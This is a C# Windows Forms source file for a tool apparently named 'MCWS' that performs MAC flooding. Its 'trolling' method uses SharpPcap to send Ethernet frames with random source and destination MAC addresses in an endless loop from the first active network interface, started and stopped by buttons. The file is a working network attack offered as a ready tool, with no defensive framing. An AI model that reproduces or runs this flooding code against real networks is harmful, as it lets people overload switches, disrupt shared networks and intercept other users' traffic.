using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.NetworkInformation;
using SharpPcap;
using PacketDotNet;
using System.Runtime.InteropServices;
namespace M15A3_MCWS
{
    public partial class macFlooding : Form
    {
        public macFlooding()
        {
            InitializeComponent();
        }
        PhysicalAddress admac;
        string name;
        string desc;
        string id;
        int x;
        int i = 0;
        CaptureDeviceList cdl = CaptureDeviceList.Instance;
        ILiveDevice dev;
        //The random MAC method is not mine.
        public static PhysicalAddress randmac()
        {
            var random = new Random();
            var buffer = new byte[6];
            random.NextBytes(buffer);
            var result = String.Concat(buffer.Select(x => string.Format("{0}:", x.ToString("X2"))).ToArray());
            return PhysicalAddress.Parse(result.TrimEnd(':'));
        }
        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.Close();
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();

        private void panel1_Click(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }
        private void pictureBox3_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            if (this.WindowState != FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Minimized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }
        public bool flooding = true;
        public void trolling()
        {
            if (dev != null)
            {
                while (flooding)
                {
                    EthernetPacket ep = new EthernetPacket(randmac(), randmac(), EthernetType.None);
                    dev.SendPacket(ep);
                }
            }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            Task.Factory.StartNew(() => trolling());
        }

        private void macFlooding_Load(object sender, EventArgs e)
        {
            try
            {
                this.AutoScaleMode = AutoScaleMode.Dpi;
                NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                foreach (NetworkInterface n in nics)
                {
                    if (n.OperationalStatus == OperationalStatus.Up)
                    {
                        admac = n.GetPhysicalAddress();
                        name = n.Name;
                        desc = n.Description;
                        id = n.Id;
                        break;
                    }
                    else
                    {
                        x++;
                    }
                }
                foreach (ILiveDevice d in cdl)
                {
                    if (d.MacAddress == admac && d.Name == name)
                    {
                        dev = d;
                    }
                }
                if (cdl.Count > 0)
                {
                    foreach (ILiveDevice d in cdl)
                    {
                        comboBox1.Items.Insert(i, i + ") " + d.Name + d.Description + " | MAC Address: " + d.MacAddress);
                        i++;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "M17 MCWS - Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            flooding = false;
        }
    }
}
